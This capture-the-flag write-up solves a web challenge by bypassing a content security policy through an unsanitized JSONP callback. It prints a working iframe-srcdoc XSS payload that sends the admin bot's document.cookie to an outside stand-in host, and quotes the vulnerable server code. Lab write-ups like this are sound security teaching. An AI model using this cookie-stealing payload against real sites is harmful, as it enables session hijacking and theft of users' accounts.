# Alien complaint form

Challenge text:
```
The Aliens found a cool new security feature called CSP and have since implemented it into their HR Complaint Form. There are reports that any issues reported by humans are not taken into account and instead deleted. The Human resistance has left a backdoor in the website that can be used to acquire sensitive information from the Aliens. Can you find it?
```
Along with the [source code](web_alien_complaint_form).

When you go to the website, there's a textbox that allows you to submit a complaint, there's nothing too interesting about this, so I check the included source code.

Upon submitting the complaint, it's safely added to a database (no SQLi), and then a puppeteer bot visits the endpoint `/list`. The website loads all complaints from the database using an API call, and appends it using innerHTML.

Since our complaint is added to the `/list` website by appending to a list's innerHTML we cant simply embed a script tag, as it won't run. A common bypass to get innerHTML XSS is for example by doing `<img src="x" onerror="alert(1)">`, as images are still loaded. However, due to the `default-src 'self';` part of the website's content security policy, we're unable to execute any JavaScript this way, we have to keep looking.

The aforementioned API call to load all complaints is to `/api/json`, if we go there we see this response.
```js
display([{"id":1,"complaint":"Employee #1655 resolved to slurs once a mistake was pointed out.","species":"Alien","created_at":"2021-04-21 21:45:09"},{"id":2,"complaint":"Employee #7843 ate my intergalactic donut.","species":"Alien","created_at":"2021-04-21 21:45:09"},{"id":3,"complaint":"Employee #4933 made coffee for everyone except me.","species":"Alien","created_at":"2021-04-21 21:45:09"}]
```
This response is then added as the content of a script tag, which means it'll execute the `display()` function on the website , which will show all the complaints. This is a normal JSONP implementation. However, I noticed that the endpoint was using it's own (unsanitized) JSONP implementation.
```js
let callback = request.query.callback || 'display';
reply.header('Content-Type', 'application/javascript');
let feedback = await db.getFeedback()
	.then(feedback => {
		if (feedback) {
			return feedback;
		}
		return 'The Galactic Federation archives appear to be empty.';
	})
	.catch(() => {
		return 'The Galactic Federation spaceship controller has crashed.';
	});
reply.send(`${callback}(${JSON.stringify(feedback)})`); // as we see here, callback is not sanitied in any way, and will allow us to execute JS code.
```
Since the input is not sanitized we can set the callback value to whatever we want, which can lead to XSS when embedded. `http://138.68.182.108:30025/api/jsonp?callback=alert(1);//` will respond with
```js
alert(1);//([{"id":1,"complaint":"Employee #1655 resolved to slurs once a mistake was pointed out.","species":"Alien","created_at":"2021-04-21 21:45:09"},{"id":2,"complaint":"Employee #7843 ate my intergalactic donut.","species":"Alien","created_at":"2021-04-21 21:45:09"},{"id":3,"complaint":"Employee #4933 made coffee for everyone except me.","species":"Alien","created_at":"2021-04-21 21:45:09"}])
```

If we somehow manage to embed this URL, it won't trigger the CSP, and we have an XSS. However, as mentioned ealier, we can't do `<script src="http://138.68.182.108:30025/api/jsonp?callback=alert(1);//"></script>`, as script tags won't execute when appended to innerHTML. Iframes are however embedded, and we can set the srcdoc of an iframe to a script tag with the JSONP XSS source.

```html
<iframe srcdoc="<script src='/api/jsonp?callback=window.open(`https://example.com?c=`+document.cookie+`;//`)'></script>"></iframe>
```
and when properly URL encoded;
```html
<iframe srcdoc="<script src='/api/jsonp?callback=window.open%28%60https%3A%2F%2Fexample.com%3Fc%3D%60%2Bdocument.cookie%2B%60%3B%2F%2F%60%29'></script>"></iframe>
```

If we send in this as a complaint, a script with the source code
```js
window.open(`https://example.com?c=`+document.cookie+`;//([{"id":1,"complaint":"Employee #1655 resolved to slurs once a mistake was pointed out.","species":"Alien","created_at":"2021-04-21 21:45:09"},{"id":2,"complaint":"Employee #7843 ate my intergalactic donut.","species":"Alien","created_at":"2021-04-21 21:45:09"},{"id":3,"complaint":"Employee #4933 made coffee for everyone except me.","species":"Alien","created_at":"2021-04-21 21:45:09"}])
```
will be embedded on the admin's site, and since the script's src is from an internal endpoint, it won't trigger the CSP. We will then recieve the admin's cookies in our webhook.